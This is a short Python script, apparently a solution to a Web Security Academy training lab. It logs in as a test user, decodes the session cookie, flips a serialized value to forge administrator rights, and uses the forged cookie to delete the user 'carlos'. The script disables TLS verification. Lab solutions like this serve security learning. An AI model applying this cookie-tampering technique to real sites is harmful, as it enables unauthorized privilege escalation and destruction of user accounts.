from email.mime import base
import urllib.parse
import base64
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# get cookie
url = "https://0abe009003c7dd1bc1f22a6500be004b.web-security-academy.net/login"
values = {"username": "wiener", "password": "peter"}
r = requests.post(url, data=values, allow_redirects=False, verify=False)
cookie = r.cookies.get_dict()['session']

# base64, url encode and decode
url_decode = urllib.parse.unquote(cookie)
base64_d = base64.b64decode(url_decode).decode()
replace_zero = base64_d.replace("0", "1")
serial_base64_encode = base64.b64encode(bytes(replace_zero, encoding="utf-8"))
serial_url_encode = urllib.parse.quote_plus(serial_base64_encode)
print(serial_url_encode)
headers = {"cookie": "session="+serial_url_encode}


# exploit
r = requests.get("https://0abe009003c7dd1bc1f22a6500be004b.web-security-academy.net/admin/delete?username=carlos", headers=headers, allow_redirects=False, verify=False)